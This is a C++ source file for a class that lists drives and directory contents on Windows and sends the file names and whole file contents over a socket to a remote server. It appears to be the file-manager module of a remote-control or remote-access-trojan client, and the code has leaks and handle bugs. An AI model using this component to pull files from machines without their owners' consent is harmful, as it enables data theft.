#include "Cfile.h"


Cfile::Cfile(SOCKET s)
{
    m_sSever = s;
}


Cfile::~Cfile()
{
}
struct tagData
{
    int nLength;
    char  data[];
};

void Cfile::EnumFile(char* lpFileName)
{

    WIN32_FIND_DATAA FindFileData = { 0 };  // data buffer
    HANDLE hFind = FindFirstFileA(lpFileName, &FindFileData);
  
    if (hFind == INVALID_HANDLE_VALUE)
    {
        FindClose(hFind);
        return;
    }
    else
    {
        do
        {
            int n = strlen(FindFileData.cFileName)+1;
            tagData* pDate = (tagData*)new char[sizeof(tagData) + n];
            pDate->nLength = n;
            memcpy((char*)pDate + sizeof(tagData), FindFileData.cFileName, n);

            mybuf.Write((PBYTE)pDate, sizeof(tagData) + n);

            delete[] pDate;
       
        } while (FindNextFileA(hFind, &FindFileData));
    }
}

void Cfile::SendfileName()
{
    SendData(m_sSever, SEND_FILE, (char*)mybuf.GetBuffer(0), mybuf.GetBufferLen());
    mybuf.ClearBuffer();

}

void Cfile::EnumDevir()
{
    char szbuf[512] = { 0 };

    GetLogicalDriveStringsA(512, szbuf);
    int n = 512;
    tagData* pDate = (tagData*)new char[sizeof(tagData) + n];
    pDate->nLength = n;
    memcpy((char*)pDate + sizeof(tagData), szbuf, n);
    mybuf.Write((PBYTE)pDate, sizeof(tagData) + n);
    delete[] pDate;
}

void Cfile::SendFile(char* lpFileName)
{
    std::ifstream ifs;
    ifs.open(lpFileName, std::ifstream::binary);
    if (ifs.is_open())
    {
        char * buffer = new char[50000];
        while (!ifs.eof())
        {
            memset(buffer, 0, 50000);
            ifs.read(buffer, 50000);
            int n = ifs.gcount();
            SendData(m_sSever, SEND_DOWNLOAD, buffer, n);
        }
        
    }

}